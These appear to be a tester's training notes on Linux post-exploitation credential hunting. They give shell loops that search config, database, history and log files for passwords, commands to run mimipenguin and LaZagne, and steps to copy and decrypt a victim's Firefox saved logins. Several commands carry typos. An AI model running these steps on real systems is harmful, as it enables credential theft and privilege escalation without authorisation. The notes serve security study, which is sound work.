
When enumerating a system, it is important to note down any credentials. These may be found in configuration files (`.conf`, `.config`, `.xml`, etc.), shell scripts, a user's bash history file, backup (`.bak`) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

---
- [ ] run lazagne
## manual
### webroot credentials

```shell-session
 grep 'DB_USER\|DB_PASSWORD' /var/www/site/wp-config.ph
```
## spool & mail directories
he spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

```shell-session
htb_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
## üîé Config Files

```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib"); do
  echo -e "\nFile: $i"
  grep "user\|password\|pass" "$i" 2>/dev/null | grep -v "\#"
done
```

Or:

```bash
for l in $(echo ".conf .config .cnf"); do
  echo -e "\nFile extension: $l"
  find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core"
done
```

---
# BASH HISTORY
## üóÉÔ∏è Database Files

```bash
for l in $(echo ".sql .db .*db .db*"); do
  echo -e "\nDB File extension: $l"
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man"
done
```

---

## üìÑ Notes/Text Files

```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```

---

## üîç Script Files

```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh"); do
  echo -e "\nFile extension: $l"
  find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share"
done
```

---

## ‚è∞ Cronjobs

```bash
cat /etc/crontab
ls -la /etc/cron.*/
```

---

## üïµÔ∏è History Files

```bash
tail -n5 /home/*/.bash*
```

---

## üìú Log Files

### Key Files

| File                  | Description               |
| --------------------- | ------------------------- |
| `/var/log/messages`   | Generic system logs       |
| `/var/log/syslog`     | Generic system logs       |
| `/var/log/auth.log`   | Auth logs (Debian)        |
| `/var/log/secure`     | Auth logs (RedHat/CentOS) |
| `/var/log/boot.log`   | Boot info                 |
| `/var/log/dmesg`      | Hardware/driver logs      |
| `/var/log/kern.log`   | Kernel messages           |
| `/var/log/faillog`    | Failed login attempts     |
| `/var/log/cron`       | Cron job logs             |
| `/var/log/mail.log`   | Mail server logs          |
| `/var/log/httpd`      | Apache logs               |
| `/var/log/mysqld.log` | MySQL logs                |

### Search Logs for Keywords (Optimized):

```bash
for i in /var/log/*; do
  if grep -Eq "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" "$i" 2>/dev/null; then
    echo -e "\n#### Log file: $i"
    grep -E "accepted|session opened|session closed|failure|failed|ssh|password changed|new user|delete user|sudo|COMMAND=|logs" "$i" 2>/dev/null
  fi
done
```

---

## üß† Memory & Cache

### Mimipenguin

```bash
sudo python3 mimipenguin.py
```

### LaZagne

Without sudo:

```bash
python3 laZagne.py browsers
```

With sudo:

```bash
sudo python3 laZagne.py all
```

---

## üåê Browser Credentials (Firefox)

```bash
ls -l ~/.mozilla/firefox/ | grep default
cat ~/.mozilla/firefox/<profile>/logins.json | jq
python3 firefox_decrypt.py <ff_folder>
```

Or copy files from victim:

```bash
scp user@victim:/home/user/.mozilla/firefox/<profile>/* .
```

---

## üìÅ Summary of Common Target File Types

- `.conf`, `.config`, `.cnf`: Config files
    
- `.sql`, `.db`: Databases
    
- `.txt`, no extension: Notes
    
- `.py`, `.sh`, `.jar`, `.go`: Scripts
    
- `.bash_history`, `.bashrc`: History
    
- `/var/log/*`: Logs
    
- `/etc/cron*`: Cron jobs
    
- `.mozilla/firefox/*`: Browser creds
    

---


Hunting for credentials is one of the first steps once we have access to the system. These low-hanging fruits can give us elevated privileges within seconds or minutes. Among other things, this is part of the local privilege escalation process that we will cover here. However, it is important to note here that we are far from covering all possible situations and therefore focus on the different approaches.

We can imagine that we have successfully gained access to a system via a vulnerable web application and have therefore obtained a reverse shell, for example

to escalate our privileges most efficiently, we can search for passwords or even whole credentials that we can use to log in to our target. There are several sources that can provide us with credentials that we put in four categories. These include, but are not limited to:

- `Files` including configs, databases, notes, scripts, source code, cronjobs, and SSH keys
- `History` including logs, and command-line history
- `Memory` including cache, and in-memory processing
- `Key-rings` such as browser stored credentials
## Files

One core principle of Linux is that everything is a file. Therefore, it is crucial to keep this concept in mind and search, find and filter the appropriate files according to our requirements.
- Configuration files
- Databases
- Notes
- Scripts
- Cronjobs
- SSH keys
### configuration files
used by services in linux. Often they even contain credentials that we will be able to read.
files are marked with the following three file extensions (`.config`, `.conf`, `.cnf`).

#### Enumerating history files

All history files provide crucial information about the current and past/historical course of processes. We are interested in the files that store users' command history and the logs that store information about system processes.

In the history of the commands entered on Linux distributions that use Bash as a standard shell, we find the associated files in `.bash_history`. Nevertheless, other files like `.bashrc` or `.bash_profile` can contain important information.
## LOGS

Many different logs exist on the system. These can vary depending on the applications installed, but here are some of the most important ones:

|**File**|**Description**|
|---|---|
|`/var/log/messages`|Generic system activity logs.|
|`/var/log/syslog`|Generic system activity logs.|
|`/var/log/auth.log`|(Debian) All authentication related logs.|
|`/var/log/secure`|(RedHat/CentOS) All authentication related logs.|
|`/var/log/boot.log`|Booting information.|
|`/var/log/dmesg`|Hardware and drivers related information and logs.|
|`/var/log/kern.log`|Kernel related warnings, errors and logs.|
|`/var/log/faillog`|Failed login attempts.|
|`/var/log/cron`|Information related to cron jobs.|
|`/var/log/mail.log`|All mail server related logs.|
|`/var/log/httpd`|All Apache related logs.|
|`/var/log/mysqld.log`|All MySQL server related logs.|


## FIREFOX STORED CREDS

prepare: with scpy
```
*cert key* logins.json
```

```
scp user@victim:/home/<user>/.mozilia/firefox/<try pres tab> /defaults/profile/<file>
```

decrypt with firefox_decypt.py
```
python3 ~/tools/pillaging_scripts/linux/firefix_decrypt.py ff_folder
```
![[Pasted image 20250624124200.png]]

Alternatively, `LaZagne` can also return results if the user has used the supported browser.

```shell-session
python3 laZagne.py browsers
```
